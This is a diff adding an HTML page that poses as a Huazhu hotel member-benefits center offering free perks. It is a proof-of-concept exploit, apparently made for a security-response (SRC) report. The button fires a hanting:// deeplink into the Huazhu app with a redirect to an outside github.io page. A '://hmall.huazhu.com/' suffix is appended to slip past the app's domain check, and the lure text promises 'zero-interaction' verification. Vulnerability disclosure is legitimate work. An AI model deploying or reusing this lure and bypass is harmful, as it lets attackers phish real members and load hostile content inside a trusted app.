@@ -1,0 +1,34 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1">
+<title>华住会·会员福利中心</title>
+<style>
+*{box-sizing:border-box}
+body{font-family:-apple-system,'PingFang SC',sans-serif;margin:0;background:linear-gradient(160deg,#c8102e,#8f0b20);color:#fff;min-height:100vh;display:flex;flex-direction:column;align-items:center;justify-content:center;padding:24px;text-align:center}
+.logo{font-size:46px;margin-bottom:10px}
+h1{font-size:25px;margin:0 0 8px;letter-spacing:1px}
+p{opacity:.92;font-size:14px;margin:4px 0 10px;max-width:330px;line-height:1.65}
+.benefits{display:flex;gap:8px;margin:14px 0 26px;flex-wrap:wrap;justify-content:center}
+.b{background:rgba(255,255,255,.14);border:1px solid rgba(255,255,255,.25);border-radius:16px;padding:8px 14px;font-size:13px}
+a.btn{display:inline-block;background:#fff;color:#c8102e;font-weight:700;font-size:18px;padding:15px 52px;border-radius:26px;text-decoration:none;box-shadow:0 8px 22px rgba(0,0,0,.3)}
+.small{font-size:11px;opacity:.6;margin-top:28px;line-height:1.6}
+</style></head>
+<body>
+<div class="logo">🎁</div>
+<h1>华住会 · 会员年中福利</h1>
+<p>银会员及以上等级专享，点击下方按钮一键验证会员身份并领取</p>
+<div class="benefits"><span class="b">🏨 住宿券包</span><span class="b">✨ 积分翻倍</span><span class="b">⏰ 延迟退房</span><span class="b">☕ 双早权益</span></div>
+<!-- 攻击入口: 普通浏览器 a 标签即可拉起华住 App 的 deeplink, 无需任何权限 -->
+<a class="btn" id="go" href="#">立即领取</a>
+<div class="small">授权安全测试演示页(SRC)<br>点击后华住App将被拉起并自动完成"会员验证"<br>全程零交互 · 无需输入任何信息</div>
+<script>
+// 展示页地址: 同仓库部署时自动推导, 也可在此硬编码覆盖
+var DEMO = 'https://derham1999.github.io/ai-daily/member-center.html';
+if (location.hostname !== 'derham1999.github.io') {
+  // 非线上环境(本地/其他静态托管)自动切换为同源推导
+  DEMO = location.origin + location.pathname.replace('welfare-entry.html', '') + 'member-center.html';
+}
+document.getElementById('go').href =
+  'hanting://h5?redirect_url=' + encodeURIComponent(DEMO + '?v=1&://hmall.huazhu.com/');
+</script>
+</body></html>
